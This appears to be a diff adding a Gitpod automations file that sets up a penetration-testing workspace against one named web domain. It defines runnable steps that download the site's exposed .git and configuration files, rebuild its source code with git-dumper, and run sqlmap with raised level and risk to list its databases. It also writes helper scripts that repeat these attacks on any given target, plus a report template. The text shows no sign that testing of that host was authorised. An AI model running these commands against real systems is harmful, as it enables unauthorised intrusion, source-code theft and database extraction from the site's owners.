@@ -1,0 +1,209 @@
+# Gitpod Automations for Penetration Testing Workflow
+# These automations provide quick access to common pentest tasks
+
+version: 1
+
+automations:
+  # Quick target reconnaissance
+  recon:
+    description: "Perform initial reconnaissance on the target"
+    trigger: manual
+    steps:
+      - name: "Create target directory"
+        run: |
+          mkdir -p /workspace/target-data/acc.silkysystems.com
+          cd /workspace/target-data/acc.silkysystems.com
+          echo "Target reconnaissance started at $(date)" > recon.log
+      
+      - name: "Download exposed configuration files"
+        run: |
+          cd /workspace/target-data/acc.silkysystems.com
+          echo "Downloading exposed files..." | tee -a recon.log
+          
+          # Download exposed Git configuration files
+          wget -q https://acc.silkysystems.com/.git/config || echo "Git config not accessible"
+          wget -q https://acc.silkysystems.com/.git/logs/HEAD || echo "Git logs not accessible"
+          wget -q https://acc.silkysystems.com/.gitignore || echo "Gitignore not accessible"
+          
+          # Download package manager files
+          wget -q https://acc.silkysystems.com/package.json || echo "package.json not accessible"
+          wget -q https://acc.silkysystems.com/package-lock.json || echo "package-lock.json not accessible"
+          wget -q https://acc.silkysystems.com/composer.json || echo "composer.json not accessible"
+          wget -q https://acc.silkysystems.com/composer.lock || echo "composer.lock not accessible"
+          
+          # Download other config files
+          wget -q https://acc.silkysystems.com/.editorconfig || echo "editorconfig not accessible"
+          wget -q https://acc.silkysystems.com/webpack.mix.js || echo "webpack.mix.js not accessible"
+          wget -q https://acc.silkysystems.com/phpunit.xml || echo "phpunit.xml not accessible"
+          wget -q https://acc.silkysystems.com/web.config || echo "web.config not accessible"
+          
+          echo "File downloads completed at $(date)" | tee -a recon.log
+          ls -la >> recon.log
+
+  # Git repository recovery
+  git-recovery:
+    description: "Recover source code from exposed .git directory"
+    trigger: manual
+    steps:
+      - name: "Attempt Git repository recovery"
+        run: |
+          cd /workspace/target-data/acc.silkysystems.com
+          echo "Starting Git repository recovery..." | tee -a git-recovery.log
+          
+          # Use git-dumper to reconstruct the repository
+          if command -v git-dumper >/dev/null 2>&1; then
+            git-dumper https://acc.silkysystems.com/.git/ ./source-code 2>&1 | tee -a git-recovery.log
+            echo "Git recovery completed at $(date)" | tee -a git-recovery.log
+          else
+            echo "git-dumper not available, installing..."
+            pip3 install git-dumper
+            git-dumper https://acc.silkysystems.com/.git/ ./source-code 2>&1 | tee -a git-recovery.log
+          fi
+
+  # SQL injection testing
+  sql-injection:
+    description: "Test for SQL injection vulnerabilities using sqlmap"
+    trigger: manual
+    steps:
+      - name: "SQL injection testing"
+        run: |
+          cd /workspace/target-data/acc.silkysystems.com
+          echo "Starting SQL injection testing..." | tee -a sqli-test.log
+          
+          # Basic SQL injection test
+          sqlmap -u "https://acc.silkysystems.com/" \
+                 --batch \
+                 --level=3 \
+                 --risk=2 \
+                 --dbs \
+                 --output-dir=/workspace/target-data/acc.silkysystems.com/sqlmap-output \
+                 2>&1 | tee -a sqli-test.log
+
+  # Web vulnerability assessment
+  web-vuln-scan:
+    description: "Perform web vulnerability assessment with multiple tools"
+    trigger: manual
+    steps:
+      - name: "Basic web scanning"
+        run: |
+          cd /workspace/target-data/acc.silkysystems.com
+          echo "Starting web vulnerability assessment..." | tee -a web-scan.log
+          
+          # whatweb scan
+          echo "Running whatweb..." | tee -a web-scan.log
+          whatweb https://acc.silkysystems.com 2>&1 | tee -a web-scan.log
+          
+          # Check for common vulnerabilities
+          echo "Checking HTTP headers..." | tee -a web-scan.log
+          curl -I https://acc.silkysystems.com 2>&1 | tee -a web-scan.log
+
+  # Environment setup
+  setup-environment:
+    description: "Set up penetration testing environment and tools"
+    trigger: startup
+    steps:
+      - name: "Initialize pentest workspace"
+        run: |
+          # Create directory structure
+          mkdir -p /workspace/target-data
+          mkdir -p /workspace/tools
+          mkdir -p /workspace/reports
+          mkdir -p /workspace/scripts
+          
+          # Create target-specific directory
+          mkdir -p /workspace/target-data/acc.silkysystems.com
+          
+          # Create useful scripts
+          cat > /workspace/scripts/quick-sqli.sh << 'EOF'
+#!/bin/bash
+# Quick SQL injection testing script
+if [ -z "$1" ]; then
+    echo "Usage: $0 <target-url>"
+    exit 1
+fi
+
+TARGET="$1"
+OUTPUT_DIR="/workspace/target-data/$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')"
+mkdir -p "$OUTPUT_DIR"
+
+echo "Testing SQL injection on: $TARGET"
+sqlmap -u "$TARGET" --batch --dbs --output-dir="$OUTPUT_DIR/sqlmap"
+EOF
+          chmod +x /workspace/scripts/quick-sqli.sh
+          
+          # Create git recovery script
+          cat > /workspace/scripts/git-recover.sh << 'EOF'
+#!/bin/bash
+# Git repository recovery script
+if [ -z "$1" ]; then
+    echo "Usage: $0 <target-domain>"
+    exit 1
+fi
+
+DOMAIN="$1"
+OUTPUT_DIR="/workspace/target-data/$DOMAIN"
+mkdir -p "$OUTPUT_DIR"
+
+echo "Recovering Git repository from: https://$DOMAIN/.git/"
+git-dumper "https://$DOMAIN/.git/" "$OUTPUT_DIR/source-code"
+EOF
+          chmod +x /workspace/scripts/git-recover.sh
+          
+          echo "Pentest environment initialized!"
+
+  # Generate report
+  generate-report:
+    description: "Generate penetration testing report"
+    trigger: manual
+    steps:
+      - name: "Compile findings into report"
+        run: |
+          REPORT_DIR="/workspace/reports"
+          mkdir -p "$REPORT_DIR"
+          REPORT_FILE="$REPORT_DIR/pentest-report-$(date +%Y%m%d-%H%M%S).md"
+          
+          cat > "$REPORT_FILE" << 'EOF'
+# Penetration Testing Report - acc.silkysystems.com
+
+## Executive Summary
+Generated on: $(date)
+Target: https://acc.silkysystems.com
+
+## Vulnerabilities Identified
+Based on NightVision scan results and manual testing:
+
+### High Severity
+- Advanced SQL Injection
+  - Status: [Testing in progress/Confirmed/Not exploitable]
+  - Impact: [Database access/Data extraction/Authentication bypass]
+
+### Medium Severity  
+- Git Configuration Exposure
+  - Status: [Testing in progress/Confirmed/Not exploitable]
+  - Impact: [Source code disclosure/Credential exposure]
+
+### Low Severity
+- Missing Security Headers
+- Cookie Security Issues
+- Information Disclosure
+
+## Evidence Directory
+- Target data: /workspace/target-data/acc.silkysystems.com/
+- Downloaded files: Configuration files, package managers
+- SQL injection results: sqlmap output
+- Source code: Recovered via git-dumper
+
+## Recommendations
+1. Fix SQL injection vulnerabilities
+2. Secure .git directory exposure
+3. Implement proper security headers
+4. Review cookie security settings
+
+## Tools Used
+- sqlmap (SQL injection testing)
+- git-dumper (Git repository recovery)
+- wget/curl (File enumeration)
+- burpsuite (Web application testing)
+EOF
+          
+          echo "Report generated: $REPORT_FILE"
